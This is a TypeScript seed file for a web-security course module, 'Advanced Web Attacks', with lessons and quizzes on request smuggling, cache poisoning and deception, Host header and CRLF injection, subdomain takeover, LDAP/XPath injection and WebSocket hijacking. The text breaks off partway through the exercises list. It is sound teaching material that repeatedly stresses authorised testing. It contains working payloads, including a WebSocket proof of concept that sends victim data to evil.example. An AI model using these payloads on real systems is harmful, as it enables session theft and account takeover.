import type { ExerciseSeed, ModuleSeed } from './types';
import { videoSlot } from './types';

export const MODULES: ModuleSeed[] = [
  {
    slug: 'advanced-web-attacks',
    title: 'Advanced Web Attacks',
    description:
      'The web bug classes the core modules never reach - the ones that live in front-end proxies, shared caches, and forgotten DNS records. By the end you can explain how two servers disagree about where a request ends, poison a cache so one response hits everyone, spot a dangling subdomain, and confirm each finding without touching anything you are not allowed to.',
    lessons: [
      {
        slug: 'http-request-smuggling',
        title: 'HTTP Request Smuggling',
        summary: 'Two servers read the same bytes and disagree about where one request ends. That gap is the bug.',
        estimatedMinutes: 11,
        importance: 'core',
        blocks: [
          videoSlot('HTTP request smuggling - how a front-end and back-end disagree on one message'),
          {
            type: 'paragraph',
            text:
              'Most big sites have two servers in a line: a front-end (a proxy, load balancer or CDN) that faces the internet, and a back-end that actually runs the app. Request smuggling happens when those two disagree about where one HTTP request stops and the next begins. Get them to disagree and you can sneak a hidden request past the front-end that the back-end treats as real.',
          },
          {
            type: 'paragraph',
            text:
              'Picture two doormen passing a stack of letters. One counts pages by the number written on the envelope; the other counts by looking for the "THE END" line inside. If those two ways of measuring disagree, one letter can spill into the next. HTTP has exactly this problem, because there are two ways to say how long a request body is: the `Content-Length` header (a byte count) and `Transfer-Encoding: chunked` (a marker that says "read chunks until a zero-length one"). When one server trusts `Content-Length` and the other trusts `Transfer-Encoding`, your body gets split at two different points.',
          },
          {
            type: 'heading',
            level: 3,
            text: 'CL.TE: front-end counts bytes, back-end reads chunks',
          },
          {
            type: 'paragraph',
            text:
              'Walk one concrete CL.TE attack. You send both headers at once. The front-end obeys `Content-Length: 6` and forwards exactly six bytes of body, thinking the request is complete. The back-end obeys `Transfer-Encoding: chunked`, reads the `0` chunk terminator, decides the request ended early, and leaves the leftover bytes sitting in its buffer as the START of the next request. Whoever connects next has your smuggled bytes glued to the front of their request.',
          },
          {
            type: 'code',
            language: 'text',
            filename: 'cl-te-smuggle',
            code: 'POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nX: x',
          },
          {
            type: 'paragraph',
            text:
              'Read what happens. The front-end sees `Content-Length: 6` and forwards the first six bytes: `0\\r\\n\\r\\n`. The back-end sees `Transfer-Encoding: chunked`, treats `0` as the final chunk, and stops - so `GET /admin...` is left over and prepended to the next visitor\'s request. That victim unknowingly sends a request to `/admin` with your smuggled line attached. The confirmation you look for is a timing tell: send a smuggled request that the back-end will wait on, and if the whole connection hangs for the exact timeout, the two servers split the message differently - that delay is the proof, not a guess.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**CL.TE** - front-end uses `Content-Length`, back-end uses `Transfer-Encoding`',
              '**TE.CL** - the reverse: front-end chunked, back-end byte-count',
              '**TE.TE** - both support chunked but one can be fooled by an obfuscated header like `Transfer-Encoding : chunked`',
              'The tell is a **time delay** - the back-end waits for bytes that never come',
              'You send raw bytes, so you need a tool that will not silently normalise the headers',
            ],
          },
          {
            type: 'paragraph',
            text:
              'Why it matters: a smuggled request runs with the front-end\'s trust and can steal the next user\'s request (capturing their session cookie), bypass front-end access rules that guard `/admin`, or turn a harmless reflected value into a stored one that poisons everyone behind the same connection. In a report you name which desync (CL.TE / TE.CL), the exact headers that triggered it, and the concrete impact - "front-end auth on `/admin` bypassed" beats "servers disagree".',
          },
          {
            type: 'callout',
            variant: 'warning',
            title: 'Do not blind-fire this',
            text:
              'A smuggled request can attach itself to a real user\'s traffic, so a careless test can break other people\'s requests on a live site. Confirm with timing on a request that affects only you before doing anything that touches another connection.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Authorised targets only',
            text: 'Request smuggling can disrupt live traffic for real users - only run it against a system you own or have written permission to test.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'You just unlocked',
            text: 'You can explain a CL.TE desync in one breath - two servers, two ways to measure length, one leftover request.',
          },
          {
            type: 'quiz',
            question: 'What causes an HTTP request smuggling desync?',
            options: [
              'The front-end and back-end disagree on where one request ends',
              'The server runs out of memory under load',
              'The browser sends a malformed cookie',
              'TLS fails to negotiate a cipher',
            ],
            correctIndex: 0,
            explanation:
              'Smuggling exploits two servers measuring the same request differently - usually Content-Length vs Transfer-Encoding - so leftover bytes bleed into the next request.',
          },
        ],
      },
      {
        slug: 'web-cache-poisoning',
        title: 'Web Cache Poisoning',
        summary: 'Get one bad response saved in a shared cache, and it gets served to everyone who visits after you.',
        estimatedMinutes: 10,
        importance: 'core',
        blocks: [
          {
            type: 'paragraph',
            text:
              'A cache saves a copy of a response so the next person who asks for the same page gets it fast, without bothering the server. Web cache poisoning is when you trick the cache into saving a response that contains your payload - and then it hands that poisoned copy to every user who requests the page after you.',
          },
          {
            type: 'paragraph',
            text:
              'The whole trick lives in the **cache key**. The cache decides "is this the same request as one I already saved?" by looking at a few parts of the request - usually the path and host - and ignoring the rest. The parts it looks at are the key. The parts it ignores are **unkeyed input**. If the server reflects an unkeyed header into the response, you can change the response without changing the key, so the cache thinks it is still the same page and saves your version under the normal key.',
          },
          {
            type: 'heading',
            level: 3,
            text: 'One worked example',
          },
          {
            type: 'paragraph',
            text:
              'Say the app reads the `X-Forwarded-Host` header and uses it to build a `<script src=...>` tag for its assets - a common pattern. The cache keys only on the path `/`, not on that header. You send the request below.',
          },
          {
            type: 'code',
            language: 'text',
            filename: 'poison-request',
            code: 'GET / HTTP/1.1\r\nHost: example.com\r\nX-Forwarded-Host: evil.example\r\n\r\n',
          },
          {
            type: 'paragraph',
            text:
              'The server reflects your header, so the response now contains `<script src="//evil.example/app.js">`. Because the cache ignored `X-Forwarded-Host`, it saves this poisoned response under the key for `/`. Now every normal visitor who loads `/` - sending a perfectly clean request with no weird header - gets your `<script>` tag and loads JavaScript from your server. You confirm it by requesting the page a second time from a *clean* browser session and checking the `X-Cache: hit` response header plus the presence of `evil.example` in the body. If a clean request returns your payload, the cache is genuinely poisoned; if only your own request shows it, it was just reflection, not poisoning.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**Cache key** - the request parts the cache compares (usually path + host)',
              '**Unkeyed input** - headers or params the cache ignores but the app still uses',
              'Classic unkeyed suspects: `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Host`, odd query params',
              '`X-Cache: hit` / `Age:` headers tell you the response came from the cache, not the server',
            ],
          },
          {
            type: 'paragraph',
            text:
              'Impact scales with the audience. Reflection XSS hits one person who clicks a link; cache poisoning takes that same reflection and serves it to everyone hitting a popular cached page until the cache expires. That is why a header reflection that would be low severity on its own becomes high when it is cacheable. In your report, prove the response is served from cache to a second user, and note how long the poison persists before the cache refreshes.',
          },
          {
            type: 'callout',
            variant: 'info',
            title: 'Find the unkeyed input first',
            text:
              'Add a junk value to a candidate header, then a cache-buster to the path so you do not poison the real page while testing. Change one input at a time so you know exactly which one is unkeyed.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Test responsibly',
            text: 'A poisoned cache affects real visitors - only do this on assets you own or are explicitly authorised to test, and use cache-busters while probing.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'Level up',
            text: 'You can explain cache key vs unkeyed input, and why a poisoned response reaches people who never sent your payload.',
          },
          {
            type: 'related_lesson',
            lessonSlug: 'security-misconfiguration',
            title: 'Related: Security Misconfiguration',
          },
          {
            type: 'quiz',
            question: 'What makes an input useful for cache poisoning?',
            options: [
              'The app uses it in the response, but the cache does not include it in the cache key',
              'It is encrypted end to end',
              'It appears in the URL path',
              'The browser strips it before sending',
            ],
            correctIndex: 0,
            explanation:
              'Unkeyed input changes the response without changing the cache key, so the poisoned response is saved under the normal key and served to everyone.',
          },
        ],
      },
      {
        slug: 'web-cache-deception',
        title: 'Web Cache Deception',
        summary: 'Trick the cache into saving a victim\'s private page as if it were a public file. Then just read it.',
        estimatedMinutes: 9,
        importance: 'core',
        blocks: [
          {
            type: 'paragraph',
            text:
              'Web cache deception is the mirror image of poisoning. Instead of putting your payload into a cached response, you fool the cache into storing someone else\'s private page - their account settings, their profile - as if it were a harmless static file. Then you load the cached copy and read their data.',
          },
          {
            type: 'paragraph',
            text:
              'It works because caches and apps split the URL differently. A cache is often told "cache anything ending in `.css`, `.js`, `.jpg` - those are static and safe." The app, meanwhile, routes by the part of the path it recognises and frequently ignores extra junk on the end. Those two rules collide. If the app serves `/account` and also happily serves `/account/anything.css` with the same private content, while the cache sees the `.css` and decides to store it, you have a private page sitting in a public cache under a URL you control.',
          },
          {
            type: 'heading',
            level: 3,
            text: 'The trick, step by step',
          },
          {
            type: 'paragraph',
            text:
              'You send a victim a link to `https://example.com/account/photo.css`. They are logged in, so they click it. The app ignores the `/photo.css` suffix, matches the route to `/account`, and returns their real account page - full of their personal details. On the way back out, the cache sees a `.css` extension, assumes it is a static stylesheet safe to store, and caches the response. Now you request that exact same URL yourself, logged out. The cache serves you the stored copy - the victim\'s account page. Their data, delivered to you, because the cache never knew it was private.',
          },
          {
            type: 'code',
            language: 'text',
            filename: 'deception-flow',
            code: '1. Victim opens: GET /account/photo.css   (logged in)\n2. App returns victim\'s /account page\n3. Cache stores it (saw ".css", assumed static)\n4. Attacker opens: GET /account/photo.css  (logged out)\n5. Cache serves the stored victim page',
          },
          {
            type: 'paragraph',
            text:
              'The confirmation is clean and self-contained: you can test the whole thing with two of your OWN accounts. Log in as account A, open `/account/photo.css`, and note the response. Then request the same URL as account B (or logged out) and check for an `X-Cache: hit` header and account A\'s data in the body. If B sees A\'s private page, the deception works. You never need a real victim to prove it - which is exactly how you demonstrate it safely.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              'Needs two conditions: the app ignores a fake extension, AND the cache caches by extension',
              'Common fake suffixes to try: `/nonexistent.css`, `/x.js`, `/1.jpg`',
              'Confirm with `X-Cache: hit` and by reading the stored response from a second account',
              'Deception STEALS data; poisoning INJECTS data - opposite directions, same cache confusion',
            ],
          },
          {
            type: 'paragraph',
            text:
              'Impact is straight information disclosure of authenticated pages, which can include session tokens, API keys shown on a settings page, or personal data. Severity depends on what the private page reveals and how public the cache is. Your report should show one account reading another account\'s cached page, name the exact URL pattern, and state the sensitive fields exposed.',
          },
          {
            type: 'callout',
            variant: 'info',
            title: 'It is a path-parsing mismatch',
            text:
              'The bug is not in the cache or the app alone - it is that they disagree on what the URL means. Test whether the app returns private content for a path with a bogus static-looking suffix.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Only your own accounts',
            text: 'Prove this with two accounts you control - never lure a real user into caching their private page for you.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'Locked in',
            text: 'You can tell cache deception from cache poisoning, and prove deception safely with two of your own accounts.',
          },
          {
            type: 'quiz',
            question: 'In web cache deception, why does the cache store a private page?',
            options: [
              'The URL ends in a static-looking extension, so the cache assumes it is safe to store',
              'The user disabled their cookies',
              'The server sends a Set-Cookie header',
              'The page was requested over HTTP instead of HTTPS',
            ],
            correctIndex: 0,
            explanation:
              'The app serves private content for a URL with a fake static suffix, and the cache stores it because the extension looks like a harmless static file.',
          },
        ],
      },
      {
        slug: 'host-header-injection',
        title: 'Host Header Attacks',
        summary: 'The server trusts a header the attacker fully controls. That one bad assumption opens three different doors.',
        estimatedMinutes: 10,
        importance: 'core',
        blocks: [
          {
            type: 'paragraph',
            text:
              'Every HTTP request carries a `Host` header that says which site you are asking for. The catch: the client sends it, so an attacker controls it completely. When an app trusts the `Host` value for anything that matters, it is trusting the attacker. That single mistake powers a whole family of attacks.',
          },
          {
            type: 'paragraph',
            text:
              'Think of it like a courier reading the delivery address off a sticker YOU wrote and stuck on the parcel yourself. If the courier uses that sticker to decide which house gets the keys, you just tell it any address you like. The `Host` header is that sticker. The three doors it opens are password-reset poisoning, routing-based SSRF, and cache abuse.',
          },
          {
            type: 'heading',
            level: 3,
            text: 'Password reset poisoning - the worked example',
          },
          {
            type: 'paragraph',
            text:
              'Many apps build the password-reset link by reading the `Host` header to know their own domain. You request a reset for the victim\'s account but swap the header.',
          },
          {
            type: 'code',
            language: 'text',
            filename: 'reset-poison',
            code: 'POST /forgot-password HTTP/1.1\r\nHost: evil.example\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nemail=victim@example.com',
          },
          {
            type: 'paragraph',
            text:
              'The app generates a real reset token for the victim, then builds the email link using your `Host` value: `https://evil.example/reset?token=SECRET`. The email goes to the victim. If they click it, their browser sends the secret token to *your* server, and you use it to reset their password. You confirm it without harming anyone by requesting a reset for your OWN account with a poisoned `Host`, then reading the link in the email that arrives - if it points at `evil.example` with a valid token, the poisoning works.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**Password reset poisoning** - the reset link is built from your `Host`, sending the token to you',
              '**Routing-based SSRF** - a front-end routes upstream by `Host`, so a crafted value reaches internal services',
              '**Cache abuse** - a reflected `Host` plus a shared cache becomes cache poisoning',
              'Also try `X-Forwarded-Host` and a duplicate second `Host` header when the first is validated',
            ],
          },
          {
            type: 'paragraph',
            text:
              'Impact ranges from full account takeover (reset poisoning) to reaching internal-only systems (routing SSRF). The fix side is simple - the app should use a hard-coded, configured domain rather than the incoming header - which is exactly the sentence a triager wants: "the reset link is derived from the attacker-controlled Host header, enabling token theft and account takeover." Name which of the three variants you found and show the token or internal response you obtained.',
          },
          {
            type: 'callout',
            variant: 'info',
            title: 'The header is attacker input',
            text:
              'Treat `Host` and every `X-Forwarded-*` header as fully controlled by the sender. Anywhere the app builds a URL or routes a request from them is worth testing.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Your own account first',
            text: 'Prove reset poisoning against an account you own so no real user ever receives a poisoned link - only on systems you are authorised to test.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'You just unlocked',
            text: 'You can spot when an app trusts the Host header, and demonstrate reset poisoning safely with your own account.',
          },
          {
            type: 'related_lesson',
            lessonSlug: 'password-reset-flaws',
            title: 'Related: Password Reset Flaws',
          },
          {
            type: 'related_lesson',
            lessonSlug: 'ssrf',
            title: 'Related: SSRF',
          },
          {
            type: 'quiz',
            question: 'Why is the Host header dangerous to trust for building reset links?',
            options: [
              'The client fully controls it, so an attacker can point the link at their own server',
              'It is always encrypted so the server cannot read it',
              'Browsers randomise it on every request',
              'It is set by the DNS resolver, not the user',
            ],
            correctIndex: 0,
            explanation:
              'The Host header comes from the client. If the app builds the reset URL from it, an attacker sets it to their domain and the victim\'s token is delivered to the attacker.',
          },
        ],
      },
      {
        slug: 'crlf-and-response-splitting',
        title: 'CRLF Injection and Response Splitting',
        summary: 'Two invisible characters - carriage return and line feed - are how HTTP marks the end of a line. Inject them and you rewrite the response.',
        estimatedMinutes: 9,
        importance: 'core',
        blocks: [
          {
            type: 'paragraph',
            text:
              'HTTP headers are just lines of text, and each line ends with two invisible characters: a carriage return and a line feed, written `\\r\\n` and called CRLF. If an app takes your input and drops it into a header without stripping those characters, you can inject your own line breaks - and once you can add lines, you can add headers or even start a whole new response.',
          },
          {
            type: 'paragraph',
            text:
              'It is like a form where the clerk copies your answer straight onto an official letter. If your "answer" secretly contains a line break and a new instruction, the clerk copies that too, and now the letter says something you wrote. CRLF injection is that line break sneaking into a place that is supposed to be one tidy value.',
          },
          {
            type: 'heading',
            level: 3,
            text: 'From one injected header to a split response',
          },
          {
            type: 'paragraph',
            text:
              'The classic sink is a redirect that echoes a parameter into the `Location` header. Suppose `/redirect?url=/home` sends back `Location: /home`. You supply a URL-encoded CRLF instead. `%0d` is a carriage return and `%0a` is a line feed.',
          },
          {
            type: 'code',
            language: 'text',
            filename: 'crlf-inject',
            code: 'GET /redirect?url=/home%0d%0aSet-Cookie:%20sessionid=attacker HTTP/1.1\r\nHost: example.com',
          },
          {
            type: 'paragraph',
            text:
              'If the app does not strip the CRLF, the response headers become two lines: `Location: /home` followed by your injected `Set-Cookie: sessionid=attacker`. The browser now sets a cookie you chose - session fixation via a header you invented. Push it further with a second CRLF and a blank line and the browser reads everything after as a fresh response body, letting you inject HTML (reflected XSS through the headers). You confirm it by viewing the raw response and checking that your injected header appears on its own line; if the server rendered `%0d%0a` as literal text or stripped it, there is no injection.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '`%0d` = carriage return, `%0a` = line feed, together `%0d%0a` = one CRLF',
              'Header injection: add a `Set-Cookie`, `Location`, or CORS header',
              'Response splitting: a second CRLF plus a blank line starts an attacker-controlled body',
              'Common sinks: redirect `url=` params, values reflected into `Set-Cookie` or custom headers',
            ],
          },
          {
            type: 'paragraph',
            text:
              'Impact runs from session fixation (you set the victim\'s session cookie) to XSS (you inject a body) to cache poisoning (the split response gets cached and served to others). Modern servers strip CRLF from many sinks, so a working case is worth real severity. Report the exact parameter, the encoded payload, and the injected header or body as it appeared in the raw response.',
          },
          {
            type: 'callout',
            variant: 'warning',
            title: 'Encoding matters',
            text:
              'You almost always need URL-encoded CRLF (`%0d%0a`); raw newlines get mangled in transit. If that fails, try double-encoding (`%250d%250a`) where a proxy decodes once before the app sees it.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Authorised testing only',
            text: 'Injecting headers into live responses can affect other users through caching - keep it to targets you own or are permitted to test.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'Level up',
            text: 'You know what CRLF is, why injecting it lets you add headers, and how a second break splits the whole response.',
          },
          {
            type: 'related_lesson',
            lessonSlug: 'open-redirect',
            title: 'Related: Open Redirect',
          },
          {
            type: 'quiz',
            question: 'What does injecting %0d%0a into a reflected header let you do?',
            options: [
              'Start a new header line, adding headers or splitting the response',
              'Encrypt the response so only you can read it',
              'Delete the server\'s log files',
              'Change the server\'s IP address',
            ],
            correctIndex: 0,
            explanation:
              '%0d%0a is a CRLF - the line separator in HTTP. Injecting it into a reflected value ends the current header and lets you add your own header or an entire response body.',
          },
        ],
      },
      {
        slug: 'subdomain-takeover',
        title: 'Subdomain Takeover',
        summary: 'A subdomain still points at a service that was shut down. Claim that service and the subdomain is yours.',
        estimatedMinutes: 10,
        importance: 'core',
        blocks: [
          {
            type: 'paragraph',
            text:
              'A subdomain takeover happens when a subdomain like `blog.example.com` points (via DNS) at a third-party service - a cloud host, a CDN, a SaaS page - that the company has since stopped using, but forgot to remove the DNS record. The pointer still exists; the thing it points to is gone. If you can register that service yourself, the abandoned subdomain now serves YOUR content.',
          },
          {
            type: 'paragraph',
            text:
              'Think of a shop\'s signboard on the main road that still says "second floor" - but the shop moved out and the floor is empty. Anyone who rents that empty floor gets all the customers who follow the old sign. The DNS record is the sign; the empty floor is the deprovisioned service. This is called a **dangling** DNS record: a CNAME pointing at nothing that answers.',
          },
          {
            type: 'heading',
            level: 3,
            text: 'How you find and verify one - carefully',
          },
          {
            type: 'paragraph',
            text:
              'Start by reading the DNS. A CNAME record maps one name to another - `blog.example.com` might be a CNAME to `example-blog.hosting-provider.net`. You check whether that target is still claimed.',
          },
          {
            type: 'command',
            description: 'Read the CNAME target for a subdomain:',
            commands: ['dig blog.example.com CNAME +short', 'curl -sI https://blog.example.com'],
          },
          {
            type: 'paragraph',
            text:
              'The `dig` line shows what the subdomain points at - say `example-blog.hosting-provider.net`. The `curl -sI` shows the response. The tell of a takeover candidate is a specific, service-branded error page: something like "There is no such app" or "This bucket does not exist" or the provider\'s "domain not configured" screen, served over that subdomain. That message means the DNS points at the provider, but no active account there owns the name. Here is the line you must not cross: verifying a takeover means confirming the record is dangling and the service is unclaimed - it does NOT mean actually registering the service and serving content on a domain that is not yours. You prove the finding by documenting the CNAME plus the provider\'s unclaimed-error response, and you report it. Claiming the asset to "prove" it can itself be unauthorised and can cause real harm; the fingerprint is enough for a valid report.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**CNAME** - a DNS record pointing one name at another name',
              '**Dangling record** - the CNAME target no longer has an active owner at the provider',
              'The signature is a provider-specific "not found / not configured" page on the subdomain',
              'Verify by DNS + the error fingerprint - do NOT register the third-party service yourself',
            ],
          },
          {
            type: 'paragraph',
            text:
              'Impact is high because the subdomain is trusted: it can host convincing phishing on the real brand, receive cookies scoped to `*.example.com`, and pass same-site checks other subdomains rely on. That is why a clean, evidence-only report - CNAME target, the unclaimed error, the provider, and the potential impact - is valued even without you claiming the service. Name the exact subdomain, its CNAME target, and the fingerprint you observed.',
          },
          {
            type: 'callout',
            variant: 'info',
            title: 'The fingerprint is the proof',
            text:
              'You do not need to seize the subdomain to report it. A dangling CNAME plus the provider\'s unclaimed-service error page is a complete, verifiable finding on its own.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Verify, do not seize',
            text: 'Confirming a takeover is reading DNS and an error page. Actually registering a service on a domain you do not own can be unlawful even in a bounty - only test what you are authorised to, and stop at the fingerprint.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'Locked in',
            text: 'You can spot a dangling CNAME and prove a subdomain takeover from DNS and an error page, without ever claiming an asset that is not yours.',
          },
          {
            type: 'related_lesson',
            lessonSlug: 'subdomain-enumeration',
            title: 'Related: Subdomain Enumeration',
          },
          {
            type: 'related_lesson',
            lessonSlug: 'dns-attacks-overview',
            title: 'Related: DNS Attacks Overview',
          },
          {
            type: 'practice_ref',
            title: 'Advanced Web Attacks check',
            exerciseSlug: 'advanced-web-attacks-quiz',
          },
          {
            type: 'quiz',
            question: 'What is the safe way to verify a subdomain takeover?',
            options: [
              'Confirm the dangling CNAME and the provider\'s unclaimed-service error page, then report it',
              'Register the third-party service and host proof content on the subdomain',
              'Brute-force the login on the subdomain',
              'Change the company\'s DNS records yourself',
            ],
            correctIndex: 0,
            explanation:
              'A dangling CNAME plus the provider\'s "not configured" fingerprint is a complete finding. Actually claiming the service can be unlawful and cause harm, so you stop at verification.',
          },
        ],
      },
      {
        slug: 'ldap-and-xpath-injection',
        title: 'LDAP and XPath Injection',
        summary: 'Not every query is SQL. Directories and XML documents have their own query languages - and their own injection.',
        estimatedMinutes: 9,
        importance: 'optional',
        blocks: [
          {
            type: 'paragraph',
            text:
              'Injection is not just a SQL thing. Anywhere an app builds a query by gluing your input into a string, the same bug can appear - and two common non-SQL targets are LDAP (the directory many companies use for logins) and XPath (a query language for XML documents). Learn to spot them because a login form that is not backed by SQL might still be injectable.',
          },
          {
            type: 'paragraph',
            text:
              'The mechanism is identical to SQL injection: your input is meant to be data, but the app pastes it into query syntax, so you smuggle in operators that change what the query means. Only the syntax differs. LDAP uses filters wrapped in parentheses with `&` (and), `|` (or), `*` (wildcard); XPath uses path expressions with `and`, `or`, and quotes.',
          },
          {
            type: 'heading',
            level: 3,
            text: 'An LDAP auth-bypass example',
          },
          {
            type: 'paragraph',
            text:
              'Say a login builds this LDAP filter from your input: `(&(uid=INPUT)(password=INPUT))`. It means "find a user whose uid AND password match." You enter the username `*)(uid=*))(|(uid=*` and leave the password handling loose.',
          },
          {
            type: 'code',
            language: 'text',
            filename: 'ldap-inject',
            code: 'Intended:  (&(uid=asha)(password=secret))\nInjected:  (&(uid=*)(uid=*))(|(uid=*)(password=x))',
          },
          {
            type: 'paragraph',
            text:
              'The `*` is an LDAP wildcard matching any value, and the extra parentheses restructure the filter so the password condition no longer gates anything. The directory returns a user, and the app logs you in without a valid password. You confirm it the low-risk way: enter a single `*` or a `)` in the username field and watch for a different response - an error that leaks LDAP filter syntax, or a login that succeeds when it should not. A returned LDAP error mentioning a bad filter is a strong tell that your input reached the query unescaped.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              'LDAP special characters: `(` `)` `&` `|` `*` `=` - `*` is the wildcard',
              'XPath probes: `\' or \'1\'=\'1`, or `\'] | //user/* | a[\'` to break out of a node test',
              'The tell is a syntax error leaking the query language, or an auth bypass',
              'Same root cause as SQLi: input concatenated into query syntax instead of parameterised',
            ],
          },
          {
            type: 'paragraph',
            text:
              'Impact mirrors SQLi: authentication bypass, or reading directory/XML data you should not see (XPath injection can walk an entire XML document node by node). It is rarer than SQLi, so triagers appreciate a clear proof - the exact payload, the error or bypass it produced, and which query language you identified. Do not claim SQLi when the backend is a directory; naming LDAP or XPath correctly shows you understood the finding.',
          },
          {
            type: 'callout',
            variant: 'info',
            title: 'Probe before you conclude',
            text:
              'A single special character (`*` for LDAP, `\'` for XPath) that changes the response or leaks a filter error tells you the input reaches the query. Build the full payload only after that first signal.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Permission required',
            text: 'Bypassing a login is an attack even when it is not SQL - only attempt it on systems you own or are authorised to assess.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'You just unlocked',
            text: 'You can recognise LDAP and XPath injection as the same input-into-query bug wearing different syntax.',
          },
          {
            type: 'related_lesson',
            lessonSlug: 'sql-injection',
            title: 'Related: SQL Injection',
          },
          {
            type: 'quiz',
            question: 'LDAP and XPath injection share which root cause with SQL injection?',
            options: [
              'User input is concatenated into query syntax instead of being safely parameterised',
              'The database runs out of connections',
              'TLS certificates are expired',
              'The password is stored in plain text',
            ],
            correctIndex: 0,
            explanation:
              'All three happen when input meant as data is pasted into a query language, letting the attacker inject operators that change the query\'s meaning.',
          },
        ],
      },
      {
        slug: 'web-socket-and-sse-abuse',
        title: 'WebSocket and SSE Abuse',
        summary: 'Real-time channels skip some of the browser\'s usual defences. Cross-site WebSocket hijacking is the headline.',
        estimatedMinutes: 9,
        importance: 'optional',
        blocks: [
          {
            type: 'paragraph',
            text:
              'WebSockets and Server-Sent Events (SSE) keep a live channel open between browser and server for chat, notifications, and dashboards. That always-on link is convenient - and it sidesteps some of the protections that guard normal requests. The headline bug is cross-site WebSocket hijacking (CSWSH), which is essentially CSRF for the WebSocket handshake.',
          },
          {
            type: 'paragraph',
            text:
              'A WebSocket connection starts as an ordinary HTTP request with an `Upgrade: websocket` header. Like any request the browser sends, it automatically carries the user\'s cookies. The defence that is supposed to stop a foreign site from opening that connection is the server checking the `Origin` header - who is asking. If the server does not check `Origin`, any website the victim visits can open an authenticated WebSocket to the target as that victim.',
          },
          {
            type: 'heading',
            level: 3,
            text: 'How cross-site WebSocket hijacking plays out',
          },
          {
            type: 'paragraph',
            text:
              'You host a page on `evil.example`. When the logged-in victim visits it, your JavaScript opens a WebSocket back to the target. The browser attaches the victim\'s cookies automatically; the target server does not check `Origin`, so it accepts the connection as the victim. Now your script can send and receive messages on the victim\'s behalf - read their chat history, pull data, trigger actions.',
          },
          {
            type: 'code',
            language: 'javascript',
            filename: 'cswsh-poc',
            code: 'const ws = new WebSocket(\'wss://example.com/chat\');\nws.onopen = () => ws.send(\'{"action":"history"}\');\nws.onmessage = (e) => fetch(\'https://evil.example/log?d=\' + encodeURIComponent(e.data));',
          },
          {
            type: 'paragraph',
            text:
              'Read the script. It opens a socket to the target from your attacker page; because cookies ride along and `Origin` is unchecked, the server treats it as the victim. It asks for history, and every message the server sends back is forwarded to your server via the `fetch`. You confirm the vulnerability by hosting this on a different origin, visiting it while logged in to the target in the SAME browser, and checking whether the socket connects and returns authenticated data. If a connection from an unrelated origin succeeds and returns the victim\'s data, `Origin` is not being validated - that is the bug.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              'The WebSocket handshake is an HTTP request, so it auto-sends cookies',
              'The defence is server-side `Origin` validation on the handshake',
              'No `Origin` check = CSWSH: a foreign page opens an authenticated socket',
              'SSE (`EventSource`) has the same cookie-riding risk if `Origin`/CORS is not enforced',
            ],
          },
          {
            type: 'paragraph',
            text:
              'Impact depends on what the channel does: reading a chat feed is disclosure, but a socket that accepts action messages (place order, change setting) becomes full CSRF over a live channel. Report the missing `Origin` check, a working cross-origin connection from your test page, and the sensitive data or action it exposed. Note that a token sent inside the WebSocket messages (not just the cookie) would have blocked this - that is the fix you are effectively demonstrating is absent.',
          },
          {
            type: 'callout',
            variant: 'info',
            title: 'Check the handshake, not just the messages',
            text:
              'The whole bug is decided at the handshake by whether the server validates `Origin`. If it accepts your cross-origin connection, the message-level behaviour is just impact.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Test only what you own',
            text: 'Opening authenticated sockets as a user is an attack - run this against your own accounts on authorised targets only.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'Locked in',
            text: 'You can explain why an unchecked Origin on a WebSocket handshake becomes cross-site hijacking, and prove it from a foreign origin.',
          },
          {
            type: 'related_lesson',
            lessonSlug: 'websocket-security',
            title: 'Related: WebSocket Security',
          },
          {
            type: 'quiz',
            question: 'What server-side check prevents cross-site WebSocket hijacking?',
            options: [
              'Validating the Origin header on the WebSocket handshake',
              'Compressing the WebSocket frames',
              'Using a longer session cookie',
              'Serving the page over HTTP/2',
            ],
            correctIndex: 0,
            explanation:
              'The handshake auto-sends cookies, so the server must validate the Origin header to reject connections opened from a foreign site as the victim.',
          },
        ],
      },
    ],
  },
];

export const EXERCISES: ExerciseSeed[] = [
  {
    lessonSlug: 'subdomain-takeover',
    slug: 'advanced-web-attacks-quiz',
    title: 'Advanced Web Attacks check',
    instructions: 'Five quick ones. Get four right and the module is yours.',
    kind: 'quiz',
    xpReward: 25,
    questions: [
      {
        prompt: 'An HTTP request smuggling desync usually comes from a disagreement over which two things?',
        options: [
          'Content-Length and Transfer-Encoding',
          'GET and POST',
          'HTTP and HTTPS',
          'Cookies and localStorage',
        ],
        correctIndex: 0,
        explanation:
          'The front-end and back-end measure body length differently - one by Content-Length, one by Transfer-Encoding - so the request splits at two points.',
      },
      {
        prompt: 'What is "unkeyed input" in web cache poisoning?',
        options: [
          'Input the app uses in the response but the cache ignores for its cache key',
          'Input that is always encrypted',
          'The primary key of the database',
          'A password field',
        ],
        correctIndex: 0,
        explanation:
          'Unkeyed input changes the response without changing the cache key, so the poisoned response is stored under the normal key and served to everyone.',
      },
      {
        prompt: 'Web cache deception lets an attacker do what?',
        options: [
          'Read a victim\'s private page that the cache stored as if it were static',
          'Inject JavaScript into every visitor',
          'Delete the cache server',
